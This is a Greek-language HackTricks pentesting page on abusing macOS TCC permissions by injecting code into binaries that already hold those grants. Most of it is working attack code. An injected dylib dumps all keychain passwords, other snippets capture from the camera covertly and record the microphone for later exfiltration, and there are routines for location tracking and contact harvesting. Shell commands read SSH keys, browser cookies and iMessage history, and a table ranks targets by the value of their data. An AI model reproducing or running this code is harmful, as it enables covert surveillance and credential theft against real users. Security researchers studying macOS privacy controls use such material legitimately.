# macOS Κλοπή Διαπιστευτηρίων & Δεδομένων μέσω Δικαιωμάτων TCC

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το macOS TCC (Transparency, Consent, and Control) προστατεύει την πρόσβαση σε ευαίσθητα δεδομένα χρήστη. Όταν ένας επιτιθέμενος παραβιάσει ένα binary που ήδη διαθέτει χορηγήσεις TCC, κληρονομεί αυτά τα δικαιώματα. Αυτή η σελίδα τεκμηριώνει το εκμεταλλεύσιμο δυναμικό κάθε δικαιώματος TCC σχετικού με κλοπή δεδομένων.

> [!WARNING]
> Code injection into a TCC-granted binary (via DYLD injection, dylib hijacking, or task port) **silently inherits all its TCC permissions**. There is no additional prompt or verification when the same process reads protected data.

---

## Ομάδες Πρόσβασης Keychain

### Το Έπαθλο

Το macOS Keychain αποθηκεύει:
- **Wi-Fi passwords** — όλα τα αποθηκευμένα διαπιστευτήρια ασύρματων δικτύων
- **Website passwords** — κωδικοί ιστοσελίδων για Safari, Chrome (when using Keychain) και άλλους browsers
- **Application passwords** — λογαριασμοί email, διαπιστευτήρια VPN, development tokens
- **Certificates and private keys** — υπογραφή κώδικα, client TLS, S/MIME encryption
- **Secure notes** — μυστικά αποθηκευμένα από τον χρήστη

### Δικαίωμα: `keychain-access-groups`

Τα στοιχεία του Keychain οργανώνονται σε **ομάδες πρόσβασης**. Το entitlement `keychain-access-groups` μιας εφαρμογής απαριθμεί ποιες ομάδες μπορεί να προσπελάσει:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Εκμετάλλευση
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Πρόσβαση στην κάμερα (kTCCServiceCamera)

### Εκμετάλλευση

Ένα binary με camera TCC grant (via `kTCCServiceCamera` ή `com.apple.security.device.camera` entitlement) μπορεί να καταγράψει φωτογραφίες και βίντεο:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Σιωπηλή Καταγραφή
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Από την **macOS Sonoma**, ο δείκτης κάμερας στη γραμμή μενού είναι μόνιμος και δεν μπορεί να κρυφτεί προγραμματικά. Σε **παλαιότερες εκδόσεις macOS**, μια σύντομη εγγραφή ενδέχεται να μην προκαλέσει εμφανή ένδειξη.

---

## Πρόσβαση στο μικρόφωνο (kTCCServiceMicrophone)

### Εκμετάλλευση

Η πρόσβαση στο μικρόφωνο καταγράφει όλο τον ήχο από το ενσωματωμένο μικρόφωνο, το ακουστικό ή τις συνδεδεμένες συσκευές εισόδου ήχου:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Επίθεση: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Παρακολούθηση Τοποθεσίας (kTCCServiceLocation)

### Εκμετάλλευση
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Συνεχής Παρακολούθηση
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Επαφές / Ημερολόγιο / Φωτογραφίες

### Εξαγωγή Προσωπικών Δεδομένων

| TCC Service | Framework | Δεδομένα |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Ονόματα, διευθύνσεις email, τηλέφωνα, διευθύνσεις |
| `kTCCServiceCalendar` | `EventKit` | Συσκέψεις, συμμετέχοντες, τοποθεσίες |
| `kTCCServicePhotos` | `Photos.framework` | Φωτογραφίες, στιγμιότυπα οθόνης, μεταδεδομένα τοποθεσίας |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Συλλογή Επαφών
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Πρόσβαση στον λογαριασμό iCloud

### Δικαίωμα: `com.apple.private.icloud-account-access`

Αυτό το δικαίωμα επιτρέπει την επικοινωνία με την υπηρεσία XPC `com.apple.iCloudHelper`, παρέχοντας πρόσβαση σε:
- **iCloud tokens** — διακριτικά αυθεντικοποίησης για το Apple ID του χρήστη
- **iCloud Drive** — συγχρονισμένα έγγραφα από όλες τις συσκευές
- **iCloud Keychain** — κωδικοί πρόσβασης συγχρονισμένοι σε όλες τις συσκευές Apple
- **Find My** — τοποθεσία όλων των συσκευών Apple του χρήστη
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Η παραβίαση ενός iCloud-entitled binary επεκτείνει την επίθεση από μια **ενιαία συσκευή σε ολόκληρο το οικοσύστημα της Apple**: άλλα Macs, iPhones, iPads, Apple Watch. Ο συγχρονισμός του iCloud Keychain σημαίνει ότι οι κωδικοί πρόσβασης από όλες τις συσκευές γίνονται προσβάσιμοι.
> 
> ---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### Η πιο ισχυρή άδεια TCC

Η άδεια Full Disk Access παρέχει δυνατότητα ανάγνωσης σε **κάθε αρχείο στο σύστημα**, συμπεριλαμβανομένων:
- Δεδομένων άλλων εφαρμογών (Messages, Mail, Safari history)
- Βάσεων δεδομένων TCC (αποκαλύπτοντας όλες τις άλλες άδειες)
- Κλειδιών SSH και διαμόρφωσης
- Cookies προγράμματος περιήγησης και διακριτικών συνεδρίας
- Βάσεων δεδομένων εφαρμογών και caches
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Μήτρα Προτεραιότητας Εκμετάλλευσης

Κατά την αξιολόγηση των injectable TCC-granted binaries, προτεραιοποιήστε με βάση την αξία των δεδομένων:

| Priority | TCC Permission | Why |
|---|---|---|
| **Κρίσιμο** | Full Disk Access | Πρόσβαση σε όλα |
| **Κρίσιμο** | TCC Manager | Μπορεί να χορηγήσει οποιαδήποτε άδεια |
| **Υψηλό** | Keychain Access Groups | Όλοι οι αποθηκευμένοι κωδικοί |
| **Υψηλό** | iCloud Account Access | Συμβιβασμός πολλαπλών συσκευών |
| **Υψηλό** | Input Monitoring (ListenEvent) | Καταγραφή πλήκτρων |
| **Υψηλό** | Accessibility | Έλεγχος GUI, αυτοχορήγηση |
| **Μεσαίο** | Screen Capture | Οπική καταγραφή δεδομένων |
| **Μεσαίο** | Camera + Microphone | Παρακολούθηση |
| **Μεσαίο** | Contacts + Calendar | Δεδομένα για social engineering |
| **Χαμηλό** | Location | Φυσική παρακολούθηση |
| **Χαμηλό** | Photos | Προσωπικά δεδομένα |

## Σενάριο Εντοπισμού
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Αναφορές

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../../banners/hacktricks-training.md}}
